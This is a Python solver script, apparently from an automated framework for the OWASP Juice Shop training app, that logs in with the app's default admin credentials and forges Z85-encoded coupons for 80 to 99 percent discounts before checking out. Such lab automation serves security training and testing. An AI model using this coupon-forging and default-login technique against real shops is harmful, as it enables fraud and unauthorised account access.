from core.base_solver import BaseSolver
from core import z85_util
from datetime import datetime
from loguru import logger

class ForgedCouponSolver(BaseSolver):
    """
    Challenge: Forged Coupon (forgedCouponChallenge)
    
    Logic:
    - Format: MMMYY-DD (e.g. JAN26-99)
    - Encoding: Z85
    - Target: Discount at least 80%
    """
    @property
    def challenge_key(self) -> str:
        return "forgedCouponChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        auth = login_res.json().get("authentication", {})
        bid = auth.get("bid")
        token = auth.get("token")
        if not bid:
            logger.error("Login failed")
            return False
            
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Setup: Add product, address, and payment
        # Add product 1 to basket
        self.client.post("/api/BasketItems", json={"ProductId": 1, "BasketId": bid, "quantity": 1}, headers=headers)
        
        # Get address
        res = self.client.get("/api/Addresss", headers=headers)
        addresses = res.json().get("data", [])
        if not addresses:
            self.client.post("/api/Addresss", json={"fullName": "Admin", "mobileNum": 123456789, "zipCode": "10000", "streetAddress": "Street", "city": "City", "country": "Country"}, headers=headers)
            res = self.client.get("/api/Addresss", headers=headers)
            addresses = res.json().get("data", [])
        address_id = addresses[0]['id']
        
        # Get card
        res = self.client.get("/api/Cards", headers=headers)
        cards = res.json().get("data", [])
        if not cards:
            self.client.post("/api/Cards", json={"fullName": "Admin", "cardNum": 1111222233334444, "expMonth": 12, "expYear": 2040}, headers=headers)
            res = self.client.get("/api/Cards", headers=headers)
            cards = res.json().get("data", [])
        card_id = cards[0]['id']
        
        # Choose delivery
        delivery_id = 1
        
        # 3. Try variations
        now = datetime.now()
        months = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC']
        mon = months[now.month - 1]
        yy = now.strftime("%y")
        
        for discount in ["99", "80", "85"]:
            coupon_str = f"{mon}{yy}-{discount}"
            logger.info(f"Trying coupon: {coupon_str}")
            z85_code = z85_util.encode(coupon_str.encode('ascii'))
            
            # Apply coupon
            res = self.client.put(f"/rest/basket/{bid}/coupon/{z85_code}", headers=headers)
            if res.status_code == 200:
                logger.success(f"Coupon {coupon_str} applied! Performing checkout...")
                # Checkout
                res = self.client.post(f"/rest/basket/{bid}/checkout", json={
                    "addressId": address_id,
                    "paymentId": card_id,
                    "deliveryMethodId": delivery_id
                }, headers=headers)
                if res.status_code == 200:
                    return True
        
        return False

